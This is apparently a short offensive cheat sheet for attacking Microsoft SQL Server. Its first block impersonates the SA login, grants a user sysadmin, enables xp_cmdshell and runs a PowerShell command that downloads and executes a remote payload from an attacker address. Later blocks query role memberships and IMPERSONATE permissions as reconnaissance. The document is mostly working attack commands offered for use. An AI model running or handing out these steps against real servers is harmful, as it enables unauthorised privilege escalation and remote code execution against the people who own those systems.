# MSSQL
```bash
EXECUTE AS LOGIN = 'SA';
EXEC sp_addsrvrolemember 'user', 'sysadmin';

EXEC sp_configure 'show advanced options', '1';
RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', '1';
RECONFIGURE;

EXEC master..xp_cmdshell 'whoami';

EXEC master..xp_cmdshell 'powershell iex (iwr http://10.10.14.13/payload.ps1  -useb)';
```

### Check Permissions
```bash
SELECT SUSER_NAME() AS CurrentLogin;

// check roles permission
SELECT 
    DP1.name AS DatabaseRoleName, 
    isnull (DP2.name, 'No members') AS DatabaseUserName
FROM 
    sys.database_role_members AS DRM
RIGHT OUTER JOIN 
    sys.database_principals AS DP1
    ON DRM.role_principal_id = DP1.principal_id
LEFT OUTER JOIN 
    sys.database_principals AS DP2
    ON DRM.member_principal_id = DP2.principal_id
ORDER BY DP1.name;
```

### check if impersonate priv 
```
SELECT 
    grantee_principal.name AS Grantee,
    grantor_principal.name AS Grantor,
    permission_name,
    state_desc
FROM 
    sys.database_permissions AS perm
JOIN 
    sys.database_principals AS grantee_principal
    ON perm.grantee_principal_id = grantee_principal.principal_id
JOIN 
    sys.database_principals AS grantor_principal
    ON perm.grantor_principal_id = grantor_principal.principal_id
WHERE 
    permission_name = 'IMPERSONATE'
    AND grantee_principal.name = SUSER_NAME();
```
